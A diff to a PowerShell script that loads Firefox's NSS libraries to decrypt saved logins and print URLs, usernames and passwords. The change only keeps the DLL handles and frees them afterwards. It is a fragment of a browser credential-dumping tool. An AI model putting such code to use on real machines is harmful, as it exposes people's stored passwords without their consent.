@@ -759,7 +759,8 @@
 
     $FunctionDefinitions = @(
         (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [string]) -Charset Ansi -SetLastError),
-        (func kernel32 LoadLibrary ([IntPtr]) @([string]) -Charset Ansi -SetLastError)
+        (func kernel32 LoadLibrary ([IntPtr]) @([string]) -Charset Ansi -SetLastError),
+        (func kernel32 FreeLibrary ([Bool]) @([IntPtr]) -Charset Ansi -SetLastError)
     )
 
     $TSECItem = struct $Mod TSECItem @{
@@ -792,7 +793,7 @@
         if(Test-Path $msvcr120dll)
         {
          
-            $Kernel32::LoadLibrary($msvcr120dll) | Out-Null
+            $msvcr120dllHandle = $Kernel32::LoadLibrary($msvcr120dll)
             $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
             Write-Verbose "Last Error when loading mozglue.dll: $LastError"
             
@@ -802,7 +803,7 @@
         if(Test-Path $msvcp120dll)
         {
        
-            $kernel32::LoadLibrary($msvcp120dll) | Out-Null
+            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll) 
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
             Write-Verbose "Last Error loading mscvp120.dll: $LastError" 
             
@@ -811,7 +812,7 @@
         if(Test-Path $mozgluedll)
         {
             
-            $Kernel32::LoadLibrary($mozgluedll) | Out-Null
+            $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll) 
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
             Write-Verbose "Last error loading msvcr120.dll: $LastError"
             
@@ -955,6 +956,11 @@
         {
             $passwordlist | Format-List URL, UserName, Password
         }
+
+        $kernel32::FreeLibrary($msvcp120dllHandle) | Out-Null
+        $Kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null
+        $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
+        $kernel32::FreeLibrary($nssdllhandle) | Out-Null
       
     }
     else
